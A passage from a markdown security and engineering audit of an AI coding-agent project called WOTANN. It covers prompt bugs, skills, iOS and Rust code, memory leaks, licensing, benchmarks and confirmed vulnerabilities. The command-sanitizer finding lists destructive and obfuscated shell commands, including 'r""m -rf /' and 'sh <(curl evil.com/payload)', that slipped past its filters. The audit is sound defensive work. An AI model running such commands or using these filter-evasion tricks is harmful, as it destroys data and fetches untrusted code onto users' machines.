9. Ship active-memory blocking sub-agent (~400 LOC from OpenClaw pattern)
10. Native Gemini adapter with google_search + code_execution + url_context (~300 LOC, unlocks free tools for free-tier users)

---

## Cross-session topic keys for follow-up

All detailed evidence is preserved in Engram at these topic keys:
- `audits/wotann-2026-04-14` — original audit
- `audits/wotann-2026-04-14-v2` — ship-blocker refinement
- `audits/wotann-v3-deep` — round 3 findings
- `audits/wotann-v3-round3` — context/middleware/tools/skills/prompts
- `audits/wotann-hermes-exhaustive` — 862-file hermes catalogue
- `audits/wotann-kairos-rpc-and-ohmypi` — 153 RPC handlers + oh-my-pi
- `audits/wotann-openclaw-kairos` — OpenClaw + free-code flag leak
- `audits/wotann-openclaw-existential-threat` — strategic re-framing
- `audits/wotann-v3-final-subsystems` — 7 remaining subsystems
- `audits/wotann-v4-builders-anthropic` — app builders + Anthropic race
- `audits/wotann-v4-5-returns` — 5 major v4 returns
- `audits/wotann-v4-cost-optimization` — 82% cost savings roadmap
- `wotann/tool-serialization-bug` — THE critical bug
- `wotann/security-credential-leak` — urgent credential rotation

---

# ROUND 5 APPENDICES — Post-initial-audit deep-dives

> These sections were added after the initial 22-section audit. Round 5 covered: file-by-file reading of every skill/iOS view/Rust file/prompt module, missing-competitor research (Codex/Crush/Serena/Kilo/Copilot CLI/Apple Intelligence), benchmark positioning roadmap, internal risks (memory leak/immutability/latency/license), live E2E testing, supply-chain security. 5 parallel agents + live bash verification.

---

## 23. The SOUL.md Regex Bug — Norse Identity Is Decorative

**The single most impactful hidden bug in the entire audit**:

`src/prompt/modules/identity.ts:37` uses regex:
```
const valuesMatch = soul.match(/## Core Values\n([\s\S]*?)(?=\n## |$)/);
```

But `.wotann/SOUL.md` uses the heading `## What You Value` (not `## Core Values`). The regex **never matches**. `valuesMatch?.[1]` is always undefined. The if-branch at line 39 never fires.

**Result**: The entire 52-line Norse narrative (Huginn/Muninn, Mimir's well, Mead of Poetry, the Line You Do Not Cross, the Runes You Carve, In a Sentence) **never reaches the model**. The only surviving Norse element in the actual system prompt is the single line at identity.ts:30 ("Named after the Germanic All-Father — god of wisdom, war, poetry, magic, and the runes").

**Fix (one character)**: Change regex to `/## (?:Core Values|What You Value)\n...` OR rename the heading in SOUL.md.

**Impact**: Converts WOTANN's distinctive identity from decorative → load-bearing with a 30-second commit.

## 24. Skills Corpus — Honest 35/35/30 Split

86 files in `skills/`:
- **~30 excellent (35%)** — full-template with When to Use + Rules + Patterns + Example + Checklist. Marketable.
- **~30 mediocre (35%)** — some structure but no runnable example.
- **~25 minimal stubs (~29%)** — ≤1KB, bullet soup.
- **11 without frontmatter (won't load)**: `a2ui`, `batch-processing`, `benchmark-engineering`, `canvas-mode`, `computer-use`, `cost-intelligence`, `lsp-operations`, `mcp-marketplace`, `prompt-testing`, `self-healing`, plus marketing files.

**Top 15 excellent skills** (marketable): `incident-response` (197 LOC outlier with severity tables + bash toolkit), `dotnet-core`, `express-api`, `mongodb-expert`, `fastapi-expert`, `cicd-engineer`, `ultraplan`, `dream-cycle`, `redis-expert`, `postgres-pro`, `kubernetes-specialist`, `monitoring-expert`, `cloud-architect`, `trace-analysis`, `dependency-auditor`.

**Top 15 to delete/rewrite**: `skill-creator` (645B — ironic meta-skill stub), `spec-driven-workflow`, `event-driven`, `nextjs-developer`, `memory-stack`, `a2ui`, `canvas-mode`, `benchmark-engineering`, `mcp-marketplace`, `prompt-testing`, `self-healing`, `cost-intelligence`, `lsp-operations`, `computer-use` (describes fake DSL that doesn't match real API), `batch-processing`.

**Critical fiction**: `computer-use.md` describes semantic DSL `CLICK_ELEMENT("Submit")` that DOES NOT EXIST. Actual `input.rs` API is coordinate-based `click(x, y, button, count)`. Skill will teach agents wrong patterns.

## 25. iOS — Zero @Observable Migration + 3 Dead Views

Verified via ripgrep:
- `@Observable` macro: **0 occurrences across iOS/**
- `@ObservableObject`/`@StateObject`/`@EnvironmentObject`/`@ObservedObject`: **215 occurrences across 34 files**

Contradicts `skills/swift-expert.md:31` claim that WOTANN uses modern `@Observable` pattern. Every view is legacy.

**Orphaned views**:
- `MainTabView` in `WOTANNApp.swift:297-339` — 43 lines dead (ContentView switched to MainShell at line 256)
- `DashboardView` (709 lines) — replaced by HomeView in MainShell.swift:29
- `AgentListView` — only reached by orphan MainTabView (double-orphan)

**Top 10 polished iOS views**: HomeView (216 LOC), WorkView (291 LOC with filter pills + bulk actions), ArenaView (687 LOC w/ TaskGroup parallel RPC + AppStorage persistence), DashboardView (orphaned but polished), AutopilotView (cost preview RPC), MeetModeView (453 LOC with pause-based speaker diarization heuristic), OnDeviceAIView (Foundation Models gate behind #if canImport + iOS 26 check), VoiceInputView (waveform + reduce-motion), ChatView, AgentListView.

Settings tab is a "hidden admin panel" — 12 secondary features (Channels, Playground, Skills, IntelligenceDashboard, Diagnostics, Workflows, FileSearch, MemoryBrowser) buried behind menu rows. Discovered by <5% of users.

## 26. Rust Backend — Genuinely Clean

Verified across 7,152 LOC in 17 files:
- **0 unsafe blocks**
- **3 `.unwrap()` calls**, all provably safe (2 guarded by preceding `.is_ok()`, 1 on `.parent()` of known-rooted launchd plist)
- **2 TODO/FIXME markers**, both in `localsend.rs` (TLS + protocol future work — legitimately scoped)

File-by-file:
- `main.rs` (6 LOC) — thin entry
- `lib.rs` (283) — 104+ command handlers, panic handler to `~/.wotann/crash.log`, deferred tray (500ms to avoid tao panic), async sidecar with catch_unwind. Production-quality.
- `state.rs` (51) — AppState with Mutex-wrapped fields
- `tray.rs` (92) — live cost display 60s refresh, embedded PNG
- `hotkeys.rs` (30) — **honestly no-ops on Rust side** because tauri-plugin-global-shortcut causes "tao panic_nounwind on macOS"; hotkeys moved to JS
- `cursor_overlay.rs` (127) — transparent 32px click-through window
- `audio_capture.rs` (211) — Meet Mode, detects 8 meeting apps, screencapture CLI fallback (Core Audio Taps deferred explicitly)
- `ipc_client.rs` (286) — Unix Domain Socket fallback to `/var/tmp` explicitly avoiding `/tmp` for security
- `sidecar.rs` (476) — launchctl preferred, direct spawn fallback, watchdog auto-restart, TCC protected-folder detection
- `input.rs` (518) — **native Core Graphics macOS input, zero subprocesses**, tags every agent event with field 55 value 0x574F54414E4E ("WOTANN") for event tap distinction
- `localsend.rs` (600) — LocalSend Protocol v2.1, UDP multicast 224.0.0.167:53317, OnceLock singleton
- `commands.rs` (3360) — **104 #[tauri::command] handlers, ~32 LOC/command average** — not bloat, it's the routing layer
- `computer_use/` — mod.rs 140, screen.rs 210, input.rs 456 (LEGACY dual of top-level input.rs via osascript+cliclick — candidate for deletion), permissions.rs 153 (TCC probing by running real operation + checking exit code)
- `remote_control/mod.rs` (153) — 32 concurrent sessions, git worktree spawn per session, /dev/urandom for session IDs

**Honest platform callouts** (honored in code comments): macOS sandboxing honest, tao hotkey panic acknowledged, Core Audio Taps deferred with explanation.

## 27. Prompt Modules — Best and Worst

17 modules priority-sorted in `index.ts`. Realistic total token cost: 700-1500 normal mode / 1200-2000 exploit mode (vs index.ts comment claiming ~1540).

**Best 3 modules**:
- `memory.ts` (136 LOC) — tiered L0/L1/L2 loader with 4K token block budget, per-entry relevance sorting, tier upgrade hints. Most sophisticated.
- `security.ts` (142 LOC) — MITRE tactic IDs (TA0043-TA0040), 8 capability categories (Recon/VA/Exploitation/WebApp/RE/Forensics/OSINT/CTF), engagement-scope tracker. **Gated at line 130 `if (ctx.mode !== "exploit") return [];` — zero cost when unused.** Perfect gating pattern.
- `capabilities.ts` (70 LOC) — genuinely different output per provider (Claude/OpenAI/Gemini/Ollama), with model-tier variants.

**Worst 2 modules**:
- `user.ts` (36 LOC) — **pure pass-through**. Exports `DEFAULT_USER_TOKEN_BUDGET = 200` constant that the file never uses. Comment claims "Delegates to UserModel.assembleUserContext(budget)" but code doesn't call it.
- `skills.ts` (25 LOC) — Names skills but never explains when to invoke any of them.

**Broken by design**:
- `tools.ts` TOOL_CATALOG is static and out-of-sync with real tool roster (lists TaskCreate/HashlineEdit but README describes SymbolEdit/SmartRename)

## 28. Internal Risks — Memory Leaks + Immutability + Latency + License

### 28.1 Daemon unbounded growth (CRITICAL — will OOM in 30 days)

4 subsystems with ZERO retention policy:
- `audit-trail.ts:83-99` — SQLite `audit_trail` append-only, every tool call writes a row, 0 DELETE calls anywhere
- `memory/store.ts:287-294, 388-392` — `auto_capture` same pattern. 30-day daemon × 1 tool/min = 43,200 rows
- `intelligence/trace-analyzer.ts:74-81` — in-memory `entries` array, no cap, `clear()` exists but callers don't consistently invoke
- `orchestration/arena.ts:106-110` — `ArenaLeaderboard.results` unbounded, includes full response strings

**Scale impact**:
- 1K entries: safe
- 10K entries: arena + audit + auto_capture each ~50MB RSS growth
- **100K entries: audit SQLite ~100MB disk, heap 300-500MB, process RSS > 2GB in 30 days**

**Smoking gun**: **73 `.on()` calls vs 0 `.off()` calls** across src/. Listener closures live with daemon.

### 28.2 Immutability reality check

CLAUDE.md claims "Immutable data patterns throughout." Actual:
- 288 files with `.push()` = 1,620 occurrences
- 97 classes with mutable `new Map()` internal state
- **Weighted adherence: 83%** (not 100%)
- Cat A safe local builders ≈ 65% | Cat B encapsulated mutable state ≈ 33% | Cat C real violations ≈ 2%
- Recommended amendment: "Immutable value types; encapsulated mutable services"

Top mutation hotspots: `deep-research.ts` (33 pushes), `tiered-loader.ts` (32), `auto-reviewer.ts` (28), `accuracy-boost.ts` (27), `codemaps.ts` (26).

### 28.3 Latency waterfall

`wotann run "hello"` from keystroke to first token:
- Node boot + commander parse: 40-80ms
- Thin-client check: 5-15ms
- Dynamic import runtime.js: **200-450ms cold** (160+ transitive imports)
- `WotannRuntime` constructor: **80-150ms warm, 200-400ms cold** — **BOTTLENECK, 80+ eager subsystem inits**
- Config + bootstrap + pipeline + fallback: ~40-120ms total
- Network + TTFT: 190-750ms

**Cold: 555-1580ms | Warm (daemon thin-client): 340-970ms | Theoretical minimum: 340-880ms**

Competitor comparison: Codex CLI ~80ms (local overhead only), Claude Code ~200ms. WOTANN cold is 3-5× slower due to runtime composition root doing too much eagerly.

Optimizations to hit theoretical:
- Lazy-init 40+ non-hot-path subsystems (−60-100ms)
- Cache parsed bootstrap blob with mtime (−10-25ms)
- Pre-warm TLS in daemon (−40-60ms)
- Pre-assemble system prompt hash-keyed per config version (−10-30ms)

### 28.4 🔴 LICENSE BLOCKER — Proprietary Anthropic SDK

**`@anthropic-ai/claude-agent-sdk` LICENSE.md** reads:
> "© Anthropic PBC. All rights reserved. Use is subject to the Legal Agreements outlined here: https://code.claude.com/docs/en/legal-and-compliance."

This is **proprietary**, not open-source. WOTANN's `package.json:51` declares `"license": "MIT"` but bundles this proprietary SDK. Implications:
1. Redistribution (npm publish, binary bundle, Docker image) embeds Anthropic proprietary software — requires distribution license likely not granted to third parties
2. Misleads downstream users ("everything MIT" expectation)
3. SDK terms restrict reverse-engineering

**Mitigation ranked**:
1. Make it `peerDependency` — users install themselves, WOTANN never bundles. CLEANEST.
2. Switch core query path to plain `@anthropic-ai/sdk` (MIT) and drop claude-agent-sdk
3. Obtain written distribution rights from Anthropic

**Other license risks**:
- `@img/sharp-libvips-darwin-arm64` is **LGPL-3.0-or-later** — requires notice + source-offer if shipped
- `lightningcss` is MPL-2.0 — per-file copyleft, verify not shipped
- Everything else (274+ deps): MIT/ISC/BSD/Apache — safe

**npm audit**: 2 moderate CVEs in hono + @hono/node-server (middleware bypass + cookie validation + path traversal). Fixable via `npm audit fix`.

**Competitor IP adoption**: oh-my-pi (MIT, already credited) / OpenClaw (MIT, already credited) / OpenCode (MIT) — safe. **claw-code and paoloanzn/free-code are UNLICENSED — copying = infringement, cleanroom only.** hermes-agent license unverified.

## 29. Round-5 Competitor Deep Dives

See Engram `audits/wotann-v5-competitors-benchmarks` for full data. Key NEW threats:

- **OpenAI Codex CLI (10/10)** — Rust core, plugin registry, Windows sandbox with egress rules, GPT-5.3-Codex-Spark 1000+ TPS, `/resume` + `/plugins`, bundled FREE with ChatGPT Plus/Pro, GitHub Action for CI.
- **Serena (9/10)** — **40-language** LSP (corrects prior 20-22 claim), symbol-level editing (`find_symbol`, `rename_symbol`, `insert_after_symbol`), `find_referencing_symbols` for cross-file usage tracing. MIT.
- **GitHub Copilot CLI (9/10 — GA April 2026)** — Plan Mode via Shift+Tab, **`/fleet` parallel multi-subagent convergence**, native GitHub MCP, bundled with existing Copilot seats.
- **Apple Intelligence (8/10)** — Foundation Models Framework gives FREE ~3B on-device LLM via Swift. **Could eliminate Gemma 4 bundling cost entirely.**
- **Crush (8/10)** — **mid-session provider switching with context preservation** is the signature feature NO competitor has. Swap GPT-5 → Claude → local without losing context.
- **Kilo Code (8/10)** — Snapshots with Git-backed checkpoints before+after every edit, per-tool permission granularity Allow/Ask/Deny (not binary), diff badges on every message, PR import, FIM autocomplete, Workflows as repeatable templates.

## 30. Benchmark Reality Check (CRITICAL CORRECTION)

**WOTANN's `TerminalBench 83-95%` target is UNREALISTIC**. Current SOTA (April 13, 2026):
- Claude Mythos Preview: **82%** (actual ceiling, not target)
- GPT-5.3 Codex: 77.3%
- GPT-5.4: 75.1%
- Gemini 3.1 Pro Preview: 67.4%

**Frontier models score less than 65%** in the official writeup. Adjust WOTANN target to **55-70% for credibility, 75%+ would be newsworthy**. Claiming 83-95% is a marketing red flag.

**SWE-bench Verified leaders (prestige #1)**:
- Claude Mythos Preview: **93.9%**
- GPT-5.3 Codex: 85%
- Claude Opus 4.5: 80.9%
- WOTANN realistic target: 55-65% Phase 1, 75%+ with review loops. Cost $50-150/run.

**Tau-bench Retail**: Claude Sonnet 4.5 leads at 0.862. WOTANN target 70-80%. <$20/run.

**Top 3 to target first** (best signal/cost ratio):
1. SWE-bench Verified
2. Terminal-Bench 2.0 (adjusted target)
3. Tau-bench Retail

## 31. Apple Intelligence Integration Priorities

1. **App Intents API** with AssistantSchemas — Siri drives WOTANN
2. **Foundation Models Framework** — FREE ~3B on-device LLM via Swift FoundationModels. Eliminates Gemma 4 bundling weight entirely. Phase 0 move.
3. **Writing Tools** — system-wide WOTANN invocation in any text field
4. **Live Activities + Control Center widget** — ambient presence. **Note: Live Activity BUTTONS not supported in iOS 18/2026** (corrects prior audit claim). Interactive widgets only on Lock/Home screens.
5. **Continuity via NSUserActivity** — Mac↔iPhone↔iPad handoff

## 32. The 15 Must-Adopt Patterns (from missed competitors)

1. Mid-session provider switching with context preservation (Crush)
2. Symbol-level LSP editing (Serena — `find_symbol`, `rename_symbol`, `insert_after_symbol`)
3. `/fleet` parallel multi-subagent convergence (Copilot CLI)
4. Snapshot system with Git-backed pre/post diff badges (Kilo Code)
5. Per-tool permission granularity Allow/Ask/Deny (Kilo Code)
6. Global hotkey AI invocation with selection/clipboard context (Raycast)
7. Plan/Ask/Agent mode picker via Shift+Tab cycle (Copilot CLI + Cursor)
8. Skills Gallery as shareable marketplace (Dia)
9. Plugin registry with product-scoped sync (Codex CLI)
10. Companion window always-on-top (ChatGPT Desktop)
11. Pinned conversations + visual provenance (user vs AI colored differently, Granola)
12. Non-interactive exec-server for remote control (Codex CLI)
13. `find_referencing_symbols` before signature changes (Serena)
14. NSUserActivity Handoff Mac↔iOS (Apple Continuity)
15. Background agent mode with async completion notifications (Perplexity Comet)

## 33. Round-5 Punch List — Top 15 New Actionable Commits

1. **Fix SOUL.md regex typo** — change `/## Core Values/` → `/## (?:Core Values|What You Value)/` in `identity.ts:37` (30 sec commit, activates 52 lines of Norse identity)
2. **Move `@anthropic-ai/claude-agent-sdk` to peerDependencies** (10 min, eliminates license blocker)
3. **Add retention cron for `audit_trail` + `auto_capture`** (30-day rolling window, ~50 LOC each)
4. **Cap `TraceAnalyzer.entries` at 10,000 with FIFO eviction**
5. **Cap `ArenaLeaderboard.results` at N=500**
6. **Add frontmatter to 11 silently-dropped skills** (30 min total — registry goes 76→86)
7. **Fix TerminalBench marketing claim** — change "83-95%" to "55-70% target, 75%+ aspirational" (README edit)
8. **Delete 3 orphaned iOS views** (`MainTabView`, `DashboardView`, `AgentListView` — ~1,000 LOC dead)
9. **Rename `turboquant.ts` → `ollama-kv-compression.ts`** (10 min, kills naming lie)
10. **Run `npm audit fix`** — resolves 2 moderate CVEs
11. **Amend CLAUDE.md immutability claim** to "Immutable value types; encapsulated mutable services" (honesty)
12. **Fix `tools.ts` TOOL_CATALOG** to match real tool roster (sync single source of truth)
13. **Delete `computer-use.md` skill** — describes fake DSL that doesn't match real API
14. **Delete `computer_use/input.rs` legacy dual** once top-level input.rs proven (~456 LOC)
15. **Amend `user.ts` module** — either wire `DEFAULT_USER_TOKEN_BUDGET` to `UserModel.assembleUserContext()` or delete the unused constant

## 34. Cross-session topic keys (updated)

Round 5 findings preserved in Engram at:
- `audits/wotann-v5-competitors-benchmarks` — Codex/Crush/Serena/Kilo/Copilot CLI + SWE-bench/TerminalBench
- `audits/wotann-v5-internal-risks` — memory leaks + immutability + latency + license blocker
- `audits/wotann-v5-file-by-file` — SOUL.md regex + 11 dead skills + Norse decorative + Rust verified clean + prompt module ranking

---

---

## 35. Live E2E + Supply-Chain Security (Round 5 Final — VERIFIED)

### 35.0 Live E2E test results

**`wotann link` (iOS pairing)**:
- Daemon required. Without: clear error message.
- **With daemon**: prints Host | Port | PIN | Expires | `wotann://pair?id=...&pin=...&host=...&port=...`
- **NO QR code rendered in terminal** — UX gap. Docs promise "QR or PIN"; CLI only emits deep link URL.
- PIN expires 5 min (reasonable).

**`wotann companion start`**: BROKEN — "too many arguments for 'start'. Expected 0 arguments but got 2". Commander.js schema misconfigured. Command is dead.

**Ollama streaming with tools**:
- Basic works: `run "5+5"` returns "10" via gemma4:latest
- **CLI has NO `--tools` option** — `run --help` shows only `--exit --provider --model --raw`
- Dev loop gap: adapter-level tool serialization exists but no CLI entry point to exercise end-to-end with ad-hoc JSON tools.

**Daemon startup**:
- `--verbose` flag rejected (unknown option)
- Plain `daemon start` works: "KAIROS daemon started (PID 97277, tick: 15s)"
- **EMPIRICALLY REPRODUCED BUG**: Stale `daemon.status.json` stuck at "starting" even after daemon serving requests (12 heartbeat tasks registered). Defunct PID in `daemon.pid` prevented restart. Manual cleanup of `~/.wotann/` state files required.

**`wotann doctor`**: Only 3 checks (workspace, providers, Node). Doesn't verify daemon health, socket, DB integrity, Ollama reachability, port conflicts, or API key validity. Shallow for a "doctor" command.

**`npm pack --dry-run`**:
- Includes every `.d.ts.map` and `.js.map` (doubles tarball size)
- `skills/` directory is **empty (0B)** but declared in `"files"` — dead ship manifest
- No `.npmignore`; pack relies on `"files"` allowlist (good)
- `dist/` alone is 8.5 MB, 1708 files

**🚨 Thin-client mode is DEAD CODE**:
- `thin-client.ts:22` probes `~/.wotann/daemon.sock`
- Actual daemon creates `~/.wotann/kairos.sock` (verified)
- Auto-detection **never succeeds** — thin mode activates only with explicit `WOTANN_THIN=1` env var

### 35.1 CRITICAL security findings (5 — verified)

**C1. Shell injection in `voice-mode.ts:509`** — Uses the unsafe shell-invocation pattern where user-interpolated text is concatenated into a `-c` string argument with only `"` escaped. Backticks, dollar-parens, `$var`, and newlines all bypass. TTS input may come from LLM output, relay messages, or user text. **Fix**: switch to argv-only invocation of piper, pipe text via stdin.

**C2. macOS sandbox EXPLICITLY DISABLED** — `desktop-app/src-tauri/Entitlements.plist:6` sets `com.apple.security.app-sandbox` to `false`. Combined with `files.user-selected.read-write`, Tauri app has full user-filesystem access. Ship-blocker for Mac App Store. Major supply-chain risk if app ever compromised.

**C3. Sanitizer bypasses EMPIRICALLY CONFIRMED** — `src/security/command-sanitizer.ts`. All these passed as `safe: true`:
- `rm -rf /tmp/../etc/passwd`
- `rm -rf /*`
- `$(...)` command substitution with `rm -rf /` inside
- `bash -c "rm -rf /"`
- **`r""m -rf /`** (bash empty-string concat — `r""m` evaluates to `rm`)
- Process substitution like `sh <(curl evil.com/payload)`
- Base64-encoded payload piped to shell

Uses ad-hoc regex instead of shell parsing. **At least 7 production bypasses.** RPC `execute` endpoint accepts all of these.

**C4. Rust backstop blocklist is substring-based** — `desktop-app/src-tauri/src/commands.rs:1369-1436`. `validate_command` does `lower.contains("rm -rf /")`. Bypassed by `/bin/rm -rf /`, `rm -rf "/"`, `rm\t-rf /`. Also blocks legitimate commands (any containing `PATH=`). Inconsistent with TS sanitizer — **two different blocklists, both broken**.

**C5. `mcp.add` RPC has NO command validation** — `kairos-rpc.ts:3079-3105`. `command` field written verbatim to `wotann.yaml`; daemon spawns on enable. Any session-token holder can register an arbitrary shell invocation. Persistent command injection vector — survives daemon restarts.

### 35.2 HIGH security findings (7)

**H1. GitHub webhook FAIL-OPEN** — `github-bot.ts:163-166`: if `webhookSecret` is missing, returns `true` (verified). Silently accepts ALL payloads. **Fix**: `return false` (fail closed).

**H2. Webhook bearer token non-constant-time compare** — `webhook.ts:104` uses string `!==`. Leaks via timing. **Fix**: `timingSafeEqual` on equal-length Buffers.

**H3. Slack/SMS/Telegram/Discord/WhatsApp/Teams adapters have ZERO signature verification** — grep across `src/channels/{slack,sms,telegram,discord,whatsapp,teams}.ts` found no `verifySignature` / `X-Slack-Signature` / `X-Twilio-Signature`. **Only GitHub bot verifies HMAC.** All other inbound webhooks are spoofable.

**H4. CSP allows `unsafe-inline` for scripts AND styles** — `tauri.conf.json:27`. Any XSS in React frontend → JS execution → combined with C2 (unsandboxed process) → arbitrary code execution. Tauri webview IPC amplifies risk.

**H5. Tauri binaries ship UNSIGNED** — `tauri.conf.json:44` `"signingIdentity": "-"`. No Tauri updater, no public-key pinning, no notarization. Supply-chain verification via code signature not possible at install.

**H6. npm audit findings**: **7 total — 2 high + 5 moderate**. `picomatch <3.0.2` (ReDoS, GHSA-c2c7-rcm5-vvqj) via `vite`/`vitest`. `npm audit fix` resolves all.

**H7. Stale daemon state race** — daemon PID file + status file + socket can survive crashes. `readSessionTokenFile` trusts disk. Attacker racing daemon start can write own token. `chmodSync(0o600)` partially mitigates but TOCTOU race remains.

### 35.3 MEDIUM findings (7)

- **M1. Dev/debug surfaces exposed**: prompt-injection-compromised model with session token can register rogue MCP servers or run shell commands via `execute`. No user confirmation dialog.
- **M2. Tauri `shell:default` capability**: permits any `Command::new(...)` + `open` URL from JS. Should restrict to `shell:allow-execute` with scope.
- **M3. Tauri `fs:default` capability**: webview has unscoped filesystem read/write.
- **M4. iOS Info.plist**: only Bonjour + URL scheme declared. No camera/mic/photo/location descriptions yet (safe currently, but future features will fail).
- **M5. Supabase anon key distribution**: no hardcoded creds, but `~/.wotann/settings` is user-readable. Blast radius depends on Supabase RLS hygiene. No RLS files in repo to verify.
- **M6. Command substitution bypass in `execute` RPC**: `kairos-rpc.ts:2661` uses shell-wrapped invocation. Even if sanitizer blocked top-level, the shell evaluates substitutions. Defence-in-depth requires Seatbelt (exists in `sandbox/executor.ts` but **NOT wired to this handler**).
- **M7. Stale PID race on daemon start**: `start.ts` doesn't validate `daemon.pid` with `kill(pid, 0)` before "already running" verdict.

### 35.4 LOW findings (6)

- **L1**. 5 moderate npm audit findings (`hono <4.12.12`)
- **L2-L3**. No `.husky/` or custom git hooks (expected clean)
- **L4**. `postinstall` swallows build failures with `|| echo` — hides legitimate errors
- **L5**. No Tauri auto-updater (intentional but no emergency patch mechanism)
- **L6**. ✅ Session token is cryptographically sound: `randomBytes(32)` = 256 bits, `chmod 0o600` + write with mode option

### 35.5 Shell-out census (verified)

- `execSync(`: **0 occurrences** in src/
- `execFile*`: **192 occurrences across 49 files, all array-args safe**
- Top: `platform-bindings.ts` (52), `voice-mode.ts` (13), `background-agent.ts` (9), `tts-engine.ts` (8), `vibevoice-backend.ts` (7), `camoufox-backend.ts` (6), `coordinator.ts` (5), `source-monitor.ts` (5), `pdf-processor.ts` (5), `daemon/start.ts` (5)
- `spawn/spawnSync`: 109 occurrences, mostly safe array-args
- **3 shell-string sites** with security implications:
  - `completion-oracle.ts:273`
  - `voice-mode.ts:509` (C1 critical)
  - `kairos-rpc.ts:2661` (M6 medium)

### 35.6 Filesystem write census

- `writeFileSync(`: 75 occurrences across 28 files. User-input paths NOT found in spot checks; most are fixed paths under `~/.wotann/*` or `tmpdir()`.
- `writeFile(`: 3 occurrences, all fixed paths.

### 35.7 Env exposure

**CLEAN.** No `logger.*process.env`, no console-log-over-KEY patterns, or API-key leaks in provider adapters. Only help messages print env var NAMES (e.g., `ANTHROPIC_API_KEY=sk-ant-...` with literal dots).

### 35.8 TOP 10 SECURITY FIXES (final, consolidated from all rounds)

| # | Severity | File:line | Fix |
|---|---|---|---|
| 1 | CRIT | `voice-mode.ts:509` | Argv-only piper invocation; pipe text via stdin |
| 2 | CRIT | `Entitlements.plist:6` | Set app-sandbox true; declare needed caps explicitly |
| 3 | CRIT | `security/command-sanitizer.ts` | Replace regex with `shell-quote` parser; reject any substitution/eval/exec at parse time |
| 4 | CRIT | `commands.rs:1369-1436` | Delegate to TS daemon `shell.precheck` via IPC — single source of truth |
| 5 | CRIT | `kairos-rpc.ts:3079-3105` | Add sanitizer on `mcp.add` command field; require user confirm for non-npm commands |
| 6 | HIGH | `github-bot.ts:164-166` | Fail closed when `webhookSecret` missing |
| 7 | HIGH | `webhook.ts:104` | `timingSafeEqual` comparison |
| 8 | HIGH | `tauri.conf.json:27` | Drop `'unsafe-inline'`; migrate to file-based scripts or nonces |
| 9 | HIGH | `package.json` | `npm audit fix` — resolves 2 high + 5 moderate CVEs |
| 10 | HIGH | `daemon/start.ts` | Validate `daemon.pid` with `kill(pid, 0)`; atomic-rename status.json only when fully-ready |

### 35.9 Additional ship-blocker E2E fixes

| # | Issue | Fix |
|---|---|---|
| 11 | `wotann companion start` broken | Fix commander.js schema (too many arguments) |
| 12 | `wotann link` has no QR render | Add ASCII QR via `qrcode-terminal` npm package |
| 13 | Thin-client socket path mismatch | Change `thin-client.ts:22` from `daemon.sock` → `kairos.sock` |
| 14 | `daemon start --verbose` rejected | Add verbose flag OR remove from docs |
| 15 | `doctor` is shallow | Add daemon/socket/DB/Ollama/port/API-key checks |
| 16 | `npm pack` ships maps + empty skills/ | Add `.npmignore` excluding `.map` files; remove empty skills/ from `files[]` or populate |
| 17 | Stale daemon state survives crashes | Implement PID liveness check + atomic state file writes |

---

---

---

# ROUND 6 — RECONCILIATION AUDIT (April 14, 2026 evening)

> 8 Opus-class verification agents, 712+ files read, every prior finding cross-checked with actual execution paths. Focus: "code exists ≠ code works." Prior agents' claims verified by tracing call chains from UI click to daemon handler to side effect.

---

## 36. Plan 1 (DEEP_AUDIT 76-item) Implementation Status — VERIFIED

**Overall: ~55/76 items done (~72%). But 8 items previously marked "DONE" are actually broken.**

### Phase A (Fix What's Broken) — 9/10 DONE ✅

All items verified with real code paths:
- A1: iOS streaming — DONE (StreamHandler wired, chunks accumulate)
- A2: 21 missing iOS RPC — DONE (60 distinct methods in RPCClient, all 17 flagged handlers now exist on daemon)
- A3: Weekly cost bug — DONE (reads actual `weekTotal`, no `*7`)
- A4: NotificationService — DONE (wired to agent state changes in AppState.swift)
- A5: On-device AI deps — DONE (MLX, swift-transformers in Package.swift)
- A6: Root .gitignore — DONE
- A7: config.ts copy-paste — DONE (checks `.wotann` then `.nexus` correctly)
- A8: EADDRINUSE — DONE (3-port retry with clear errors)
- A9: Session corruption guard — NOT VERIFIED
- A10: Telemetry opt-out — DONE

### Phase B (Security) — 5/7 DONE

- B1: Daemon RPC auth — DONE (session token + UDS chmod 0600), but `WOTANN_AUTH_BYPASS=1` unguarded
- B2: Gemini key → header — DONE (`x-goog-api-key` header, no query param)
- B3: Codex JWT verification — DONE (structural + async JWKS)
- B4: Remove unsafe-eval — DONE (only `unsafe-inline` remains)
- B5: Shell sanitization — PARTIAL (sandbox layer good, 3 shell-string sites remain)
- B6: Atomic writes + file locks — NOT DONE
- B7: Route-scoped FS permissions — NOT DONE

### Phase C (Consolidate) — 8/10 DONE

- C1: Merge user models — DONE (identity/ canonical, intelligence/ delegates)
- C2: Update DESIGN.md — DONE (Obsidian Precision)
- C3: Remove .nexus/ — DONE
- C4: Enrich SOUL.md — DONE (53 lines) **BUT SOUL.md regex bug means none of it reaches the model** (§23)
- C5: Remove deprecated code — PARTIAL (never-stop.ts still imported)
- C6: Fix frontend → Rust — DONE (75+ TS wrappers in useTauriCommand.ts)
- C7: Seed dream pipeline — DONE (connected via runtime.close())
- C8: Nexus → WOTANN — DONE (0 in code, 2 in config.ts legacy fallback comment)
- C9: Resolve duplicate skills — DONE (.nexus/ gone, single directory)
- C10: Enrich minimal skills — NOT DONE (10 still lack YAML frontmatter)

### Phase D (Wire Dead Features) — 4/15 DONE (corrected from prior "7/15")

**CORRECTED**: Several items previously marked "DONE" because components exist, but verification proved they are not wired end-to-end.

- D1: Computer Use UI — **DONE ✅** (only desktop feature verified WIRED end-to-end — direct `invoke()` to real Rust implementations)
- D2: Council UI — DONE (CouncilView in AppShell, RPC handler exists)
- D9: Training/Self-Evolution UI — DONE (TrainingReview component, RPC exists)
- D10: Connectors config forms — DONE (ConnectorsGUI, wired via commit c06dace)
- D12: Thin-client TUI — **BROKEN** (socket path: `daemon.sock` vs `kairos.sock`)
- D13: Oracle/Worker escalation — **NOT WIRED** (module exists, autonomous.run RPC never calls it — see §38)
- D14: CI feedback loop — NOT DONE
- D15: Visual verifier — NOT DONE
- D3-D8: Various — NOT VERIFIED from code

### Phase E (Competitive Parity) — 4/14 DONE (unchanged)

### Phase F (Upgrade Existing) — 2/9 DONE (unchanged)

### Phase G (Infrastructure) — 6/11 DONE (unchanged)

---

## 37. Plan 2 (MASTER_PLAN_PHASE_2 ~40 items) — CORRECTED STATUS

**Overall: ~12/40 truly working (~30%). Previously estimated 45% — many items had code but broken transport.**

### Tier 2 CORRECTIONS — "Cursor parity" features are NOT WORKING

| # | Item | Prior Agent | Verification | True Status |
